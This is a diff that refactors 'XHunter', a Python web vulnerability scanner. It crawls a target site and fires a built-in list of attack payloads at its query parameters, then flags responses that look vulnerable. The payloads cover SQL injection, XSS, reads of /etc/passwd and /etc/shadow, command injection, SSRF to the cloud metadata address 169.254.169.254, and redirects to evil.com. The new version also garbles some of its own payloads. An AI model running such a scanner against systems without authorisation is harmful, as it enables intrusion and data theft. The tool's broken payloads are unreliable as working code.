@@ -1,165 +1,178 @@
+ #!/usr/bin/env python3
 #################################### message from DamnBoy402 ############################################
 ## Do you want to recode this script? Please include the credit of the original author, original author = DamnBoy402, do not claim my work   ##
 ## You can contribute or help develop this script, don't forget to tag me if you upload your work to github or to other social platforms :D         ##
 ## I really appreciate your contribution in helping to develop XHunter, so, stay enthusiastic about being a programmer :D                                    ##
 #####################################################################################################
+
+"""
+    Remake by Arya Chandra Winata
+"""
+
 import argparse
 import requests
 import urllib.parse
 import os
 import random
 import threading
-import time
 from queue import Queue
 from bs4 import BeautifulSoup
 from rich.console import Console
 from rich.table import Table
-from rich.text import Text
 
 os.system("clear")
-c = Console()
+console = Console()
 
-r, rr, rrr, g, y, d = "[red]", "[bold red]", "[bright_red]", "[green]", "[yellow]", "[white]"
+RED = "[red]"
+BOLD_RED = "[bold red]"
+BRIGHT_RED = "[bright_red]"
+GREEN = "[green]"
+YELLOW = "[yellow]"
+WHITE = "[white]"
 
-c.print(f"""
-{rrr}██╗  ██╗██╗  ██╗███╗   ██╗████████╗███████╗██████╗ 
-{rr}██║  ██║██║  ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
-{r}███████║███████║██╔██╗ ██║   ██║   █████╗  ██████╔╝
-{r}██╔══██║██╔══██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
-{r}██║  ██║██║  ██║██║ ╚████║   ██║   ███████╗██║  ██║
-{r}╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
-{y}XHunter+ | Ultimate Web Vulnerability Scanner{d}
-{r}Authored By Damnboy{rrr}
+console.print(f"""
+{BRIGHT_RED}██╗  ██╗██╗  ██╗███╗   ██╗████████╗███████╗██████╗
+{BOLD_RED}██║  ██║██║  ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
+{RED}███████║███████║██╔██╗ ██║   ██║   █████╗  ██████╔╝
+{RED}██╔══██║██╔══██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
+{RED}██║  ██║██║  ██║██║ ╚████║   ██║   ███████╗██║  ██║
+{RED}╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
+{YELLOW}XHunter+ | Ultimate Web Vulnerability Scanner{WHITE}
+{RED}Authored By Damnboy{BRIGHT_RED}
 """)
 
-CRAWLED_LINKS = set()
-VULN_LINKS = []
-q = Queue()
+crawled_links = set()
+vulnerabilities_found = []
+task_queue = Queue()
 
-def xnxx():
+def load_user_agents():
     if os.path.exists("useragent.txt"):
-        with open("useragent.txt", "r") as f:
-            return [ua.strip() for ua in f.readlines() if ua.strip()]
+        with open("useragent.txt", "r") as file:
+            return [ua.strip() for ua in file.readlines() if ua.strip()]
     return [
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0.4472.124 Safari/537.36",
         "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/91.0.4472.124 Safari/537.36",
         "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
     ]
 
-USER_AGENTS = xnxx()
+USER_AGENTS = load_user_agents()
 
-HEADERS = {
-    "User-Agent": random.choice(USER_AGENTS),
-    "Referer": "https://www.google.com",
-    "X-Forwarded-For": "127.0.0.1",
-    "Accept-Encoding": "gzip, deflate",
-}
+def get_random_headers():
+    return {
+        "User-Agent": random.choice(USER_AGENTS),
+        "Referer": "https://www.google.com",
+        "X-Forwarded-For": "127.0.0.1",
+        "Accept-Encoding": "gzip, deflate",
+    }
 
 PAYLOADS = {
     "SQL Injection": ["' OR '1'='1' --", "' UNION SELECT NULL, NULL --", "' OR 1=1#"],
     "XSS": ["<script>alert(1)</script>", "'><script>alert(1)</script>", '"><img src=x onerror=alert(1)>'],
     "LFI": ["../../../../etc/passwd", "../../../../etc/shadow", "/proc/self/environ"],
     "Open Redirect": ["//evil.com", "https://evil.com", "/%2F%2Fevil.com"],
-    "RCE": ["; ls -la", "`whoami`", "| cat /etc/passwd"],
-    "SSTI": ["{{7*7}}", "{7*7}", "${7*7}"],
+    "RCE": ["; ls -la", "whoami", "| cat /etc/passwd"],
+    "SSTI": ["{{77}}", "{77}", "${7*7}"],
     "SSRF": ["http://127.0.0.1:80", "file:///etc/passwd", "http://169.254.169.254/latest/meta-data/"],
     "HPP": ["?param=1&param=2", "?q=1&q=<script>alert(1)</script>", "?x=foo&x=bar"]
 }
 
-def fvck(url):
+def fetch_url(url):
     try:
-        response = requests.get(url, headers=HEADERS, timeout=5)
+        response = requests.get(url, headers=get_random_headers(), timeout=5)
         return response
-    except:
+    except requests.RequestException:
         return None
 
-def sigma(response, payload, vuln_type, url):
+def analyze_response(response, payload, vuln_type, url):
     indicators = {
-        "SQL Injection": ["syntax error", "mysql_fetch", "mysqli", "sql syntax", "Warning: mysql"],
+        "SQL Injection": ["syntax error", "mysql_fetch", "mysqli", "sql syntax", "warning: mysql"],
         "XSS": ["<script>alert"],
-        "LFI": ["root:x:0:0", "DB_PASSWORD"],
+        "LFI": ["root:x:0:0", "db_password"],
         "Open Redirect": ["evil.com"],
         "RCE": ["uid=", "gid=", "/root"],
-        "SSTI": ["49", "Error in template"],
-        "SSRF": ["EC2", "Instance", "Metadata"],
-        "HPP": ["Duplicate parameter"]
+        "SSTI": ["49", "error in template"],
+        "SSRF": ["ec2", "instance", "metadata"],
+        "HPP": ["duplicate parameter"]
     }
 
-    if any(indicator in response.text.lower() for indicator in indicators[vuln_type]):
-        vuln_color = rrr if vuln_type in ["RCE", "SSRF", "SQL Injection"] else rr
-        c.print(f"{vuln_color}[CRITICAL] {vuln_type} at {url} with payload: {payload}")
-        VULN_LINKS.append((vuln_type, url, payload))
-        with open("result.txt", "a") as f:
-            f.write(f"{vuln_type} VULNERABILITY FOUND: {url} | Payload: {payload}\n")
+    if any(indicator in response.text.lower() for indicator in indicators.get(vuln_type, [])):
+        color = BRIGHT_RED if vuln_type in ["RCE", "SSRF", "SQL Injection"] else BOLD_RED
+        console.print(f"{color}[CRITICAL] {vuln_type} at {url} with payload: {payload}")
+        vulnerabilities_found.append((vuln_type, url, payload))
+        with open("result.txt", "a") as file:
+            file.write(f"{vuln_type} VULNERABILITY FOUND: {url} | Payload: {payload}\n")
 
-def ligma(url, payloads, vuln_type):
+def test_vulnerability(url, payloads, vuln_type):
     for payload in payloads:
         injected_url = url + urllib.parse.quote(payload)
-        response = fvck(injected_url)
+        response = fetch_url(injected_url)
         if response:
-            sigma(response, payload, vuln_type, injected_url)
+            analyze_response(response, payload, vuln_type, injected_url)
 
-def slex(url, depth, test_all):
-    if url in CRAWLED_LINKS or depth <= 0:
+def crawl(url, depth, scan_all):
+    if url in crawled_links or depth <= 0:
         return
-    CRAWLED_LINKS.add(url)
+    crawled_links.add(url)
 
-    try:
-        response = fvck(url)
-        if not response:
-            return
+    response = fetch_url(url)
+    if not response:
+        return
 
-        soup = BeautifulSoup(response.text, "html.parser")
+    soup = BeautifulSoup(response.text, "html.parser")
+    new_links = set()
 
-        for link in soup.find_all("a", href=True):
-            full_url = urllib.parse.urljoin(url, link["href"])
-            if "=" in full_url and test_all:
-                for vuln_type, payloads in PAYLOADS.items():
-                    q.put((ligma, full_url, payloads, vuln_type))
+    for link in soup.find_all("a", href=True):
+        full_url = urllib.parse.urljoin(url, link["href"])
 
-            if full_url.startswith(url):
-                slex(full_url, depth - 1, test_all)
+        if "=" in full_url and scan_all and full_url not in crawled_links:
+            new_links.add(full_url)
 
-    except Exception as e:
-        c.print(f"{r}[ERROR] {e}")
 
-def bigass():
-    while not q.empty():
-        function, *args = q.get()
-        function(*args)
-        q.task_done()
+    for link in new_links:
+        for vuln_type, payloads in PAYLOADS.items():
+            task_queue.put((test_vulnerability, link, payloads, vuln_type))
 
-parser = argparse.ArgumentParser(description="XHunter Ultra++ - Ultimate Web Vulnerability Scanner")
-parser.add_argument("-u", "--url", help="Target URL", required=True)
-parser.add_argument("--all", help="Scan ALL vulnerabilities", action="store_true")
-parser.add_argument("--depth", help="Crawl Depth (default: 2)", type=int, default=2)
 
-args = parser.parse_args()
+    for link in new_links:
+        crawl(link, depth - 1, scan_all)
 
-if __name__ == "__main__":
-    c.print(f"{y}[STARTING XHunter Ultra++]")
-    slex(args.url, args.depth, args.all)
+def worker():
+    while not task_queue.empty():
+        func, *args = task_queue.get()
+        func(*args)
+        task_queue.task_done()
 
-    threads = []
-    for _ in range(10):
-        thread = threading.Thread(target=bigass)
-        thread.daemon = True
-        thread.start()
-        threads.append(thread)
-
-    for thread in threads:
-        thread.join()
-
+def display_results():
     table = Table(title="Scan Results", header_style="bold magenta")
     table.add_column("Vulnerability Type", style="bold cyan")
     table.add_column("URL", style="bold yellow")
     table.add_column("Payload", style="bold red")
-
-    for vuln in VULN_LINKS:
-        table.add_row(vuln[0], vuln[1], vuln[2])
-
-    c.print(table)
-    c.print(f"\n{g}[SCAN COMPLETE] Results saved in result.txt")
     
+    for vuln_type, url, payload in vulnerabilities_found:
+        table.add_row(vuln_type, url, payload)
     
-# This is just a simple script, that's it :)
+    console.print(table)
+    console.print(f"\n{GREEN}[SCAN COMPLETE] Results saved in result.txt")
+
+def main():
+    parser = argparse.ArgumentParser(description="XHunter Ultra++ - Ultimate Web Vulnerability Scanner")
+    parser.add_argument("-u", "--url", help="Target URL", required=True)
+    parser.add_argument("--all", help="Scan ALL vulnerabilities", action="store_true")
+    parser.add_argument("--depth", help="Crawl Depth (default: 2)", type=int, default=2)
+    args = parser.parse_args()
+
+    console.print(f"{YELLOW}[STARTING XHunter Ultra++]")
+    crawl(args.url, args.depth, args.all)
+
+    threads = []
+    for _ in range(10):
+        t = threading.Thread(target=worker, daemon=True)
+        t.start()
+        threads.append(t)
+    for t in threads:
+        t.join()
+
+    display_results()
+
+if __name__ == "__main__":
+    main()
